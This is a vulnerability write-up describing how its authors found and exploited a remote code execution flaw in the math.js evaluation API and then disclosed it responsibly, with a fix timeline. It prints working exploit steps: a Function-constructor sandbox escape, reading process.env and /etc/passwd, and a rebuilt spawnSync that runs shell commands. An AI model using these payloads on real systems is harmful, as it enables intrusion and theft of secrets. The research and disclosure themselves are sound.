How we exploited a remote code execution vulnerability in math.js
====

This article explains in short how we found, exploited and reported a remote code execution (RCE) vulnerability. It is meant to be a guide to finding vulnerabilities, as well as reporting them in a responsible manner.

## Step one: discovery
While playing around with [a wrapper](https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua) of the math.js API (`http://api.mathjs.org/v1/?expr=expression-here`), we discovered that it **appears to evaluate JavaScript**, though with some restrictions:

```
> !calc cos
Result: function

> !calc eval
Result: function

> !calc eval("x => x")
Error: Value expected (char 3)

> !calc eval("console.log")
Error: Undefined symbol console

> !calc eval("return 1")
Result: 1
```

In particular, it seems that `eval` was replaced with a safe version. `Function` and `setTimeout`/`setInterval` didn't work, either:

```
> !calc Function("return 1")
Error: Undefined symbol Function

> !calc setTimeout
Error: Undefined symbol Function
```

## Step two: exploitation

>Now that we figured out that there are some sort of restrictions around code evaluation, we had to escape them.

There are four standard ways to **evaluate strings in JavaScript**:

  - [`eval("code")`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
  - [`new Function("code")`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function)
  - [`setTimeout("code", timeout)`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)
  - [`setInterval("code", interval)`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval)

In the math.js environment, these cannot be accessed directly, either because they aren't defined or because they have been redefined with safe functions. However, they can be accessed indirectly: notably, **`Function` can be accessed indirectly as the constructor of an existing function** - this was the key intuition that led to discovering the vulnerability.

>For example, `Function("return 1")` can be replaced with `Math.floor.constructor("return 1")`. Therefore, to evaluate `return 1`, we can use `Math.floor.constructor("return 1")()`.

We know that in the math.js environment `cos` is defined as a function, so we used that:

```
> !calc cos.constructor("return 1")()
Result: 1
```

Success!

From here we could have simply `require`-d some native modules and gained access to the OS, right? Not so fast: although the math.js API server runs in a Node.js environment, for whatever reason we couldn't use `require`.

```
> !calc cos.constructor("return require")()
Error: require is not defined
```

However, we could use `process`, which has [a few nifty features](https://nodejs.org/api/process.html):

```
> !calc cos.constructor("return process")()
Result: [object process]

> !calc cos.constructor("return process.env")()
Result: {
  "WEB_MEMORY": "512",
  "MEMORY_AVAILABLE": "512",
  "NEW_RELIC_LOG": "stdout",
  "NEW_RELIC_LICENSE_KEY": "<censored>",
  "DYNO": "web.1",
  "PAPERTRAIL_API_TOKEN": "<censored>",
  "PATH": "/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin",
  "WEB_CONCURRENCY": "1",
  "PWD": "/app",
  "NODE_ENV": "production",
  "PS1": "\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]",
  "SHLVL": "1",
  "HOME": "/app",
  "PORT": "<censored>",
  "NODE_HOME": "/app/.heroku/node",
  "_": "/app/.heroku/node/bin/node"
}
```

Though `process.env` contains some bits of juicy info, it can't really do anything interesting: we need to go deeper and use [`process.binding`](http://stackoverflow.com/q/24042861), which exposes Javascript bindings to the OS. Though they are not officially documented and are meant for internal usage, one can reconstruct their behaviour from reading through the Node.js source code. For example, we can use `process.binding("fs")` to read arbitrary files on the OS (with the appropriate permissions):

>For brevity, we'll skip the `!calc cos.constructor("code")` wrapper, and paste the relevant JS code instead.

```
> buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
<more users...>
```

We're almost done: now we need to figure out a way to open a shell and run arbitrary commands. If you have experience with Node.js, you may know about [`child_process`](https://nodejs.org/api/child_process.html), which can be used to spawn processes with `spawnSync`: we just need to replicate this feature using OS bindings (remember that we can't use `require`).

This is easier than it seems: you can just take [the source code for `child_process`](https://github.com/nodejs/node/blob/master/lib/child_process.js), remove the code you don't need (unused functions and error handling), minify it, and run it through the API.

<script src="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822.js"></script>
<noscript>
```
// Source: https://github.com/nodejs/node/blob/master/lib/child_process.js

// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}

// Defines spawnSync, the function that will do the actual spawning
spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
```
<small>Gist [here](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822</small>
</noscript>

From here, **we can spawn arbitrary processes** and run shell commands:

```
> return spawnSync('/usr/bin/whoami');
{
  "status": 0,
  "signal": null,
  "output": [null, u15104, ],
  "pid": 100,
  "stdout": u15104,
  "stderr":
}
```

## Step three: reporting

Now that we found a vulnerability and exploited it to the largest extent possible, we had to decide what to do with it. Since we exploited it for fun and have no malicious intents, we took the "white hat" road and reported it to the maintainer. We **contacted him privately** through the e-mail address listed on his GitHub profile with the following details:

 - a short description of the vulnerability (a remote code execution flaw in mathjs.eval);
 - an **example attack** with explanation of how it works (a summary of why `cos.constructor("code")()` works and what can be achieved with `process.bindings`);
 - an actual **demonstration** on the live server (we included the output of `whoami` and `uname -a`);
 - suggestions on **how to fix it** (using the [`vm` module in Node.js](https://nodejs.org/api/vm.html), for example).

Over a course of two days, we worked with the author to help fix the vulnerability. Notably, after he pushed a fix in [`2f45600`](https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159) we found a similar workaround (if you can't use the constructor directly, use `cos.constructor.apply(null, "code")()`) which was fixed in [`3c3517d`](https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd).

### Timeline
 - 26 March 2017 22:20 CEST: first successful exploitation
 - 29 March 2017 14:43 CEST: vulnerability reported to the author
 - 31 March 2017 12:35 CEST: second vulnerability (`.apply`) reported
 - 31 March 2017 13:52 CEST: both vulnerabilities are fixed

---

>This vulnerability was discovered by [\@CapacitorSet](https://github.com/CapacitorSet) and [\@denysvitali](https://github.com/denysvitali). Thanks to [\@josdejong](https://github.com/josdejong/) for promptly fixing the vulnerability and [JSFuck](http://www.jsfuck.com/) for discovering the `[].filter.constructor` trick.
>
><small>Released under [**CC-BY 4.0**](https://creativecommons.org/licenses/by/4.0/).